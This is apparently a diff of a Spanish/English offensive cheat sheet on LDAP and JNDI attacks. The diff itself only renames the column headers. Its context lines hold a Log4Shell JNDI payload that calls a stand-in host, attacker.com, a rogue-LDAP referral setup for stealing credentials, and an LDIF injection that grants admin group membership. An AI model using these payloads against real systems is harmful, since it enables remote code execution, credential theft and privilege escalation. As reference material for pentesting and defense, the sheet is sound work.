@@ -24,7 +24,7 @@ linked:
 
 ## JNDI Lookup Injection (Log4Shell-style)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | Java Naming and Directory Interface (JNDI) lookup acepta LDAP URL → atacante hostea malicious LDAP server → entrega Java class → RCE en target | Log4Shell pattern. |
 | CVE-2021-44228 (Log4j) | `${jndi:ldap://attacker.com/Exploit}` en logged string | Most famous. |
@@ -66,7 +66,7 @@ ___
 
 ## LDAP Entry Poisoning
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | App add/modify entries en LDAP. Atacante inyecta nuevo entry con malicious attributes | Persistent LDAP backdoor. |
 | Add user con admin attributes | LDIF inject `memberOf: CN=admins,...` | Privilege escalation. |
@@ -85,7 +85,7 @@ ___
 
 ## LDAP Referral Abuse
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | LDAP referrals indicate query needs to be redirected to another server. Client follows referral, sending creds to atacante's server | Credential theft via referral. |
 | Atacante sets up rogue LDAP server | Server returns `searchResRef` con URL `ldap://attacker.com/...` | Standard. |
@@ -103,7 +103,7 @@ ___
 
 ## Schema-Based Gadgets
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | LDAP schema defines attribute types con specific syntax (binary, integer, DN). Atacante exploita schema features para gadgets. | Advanced. |
 | Binary attribute upload | `jpegPhoto` accepts arbitrary binary | Storage vector. |
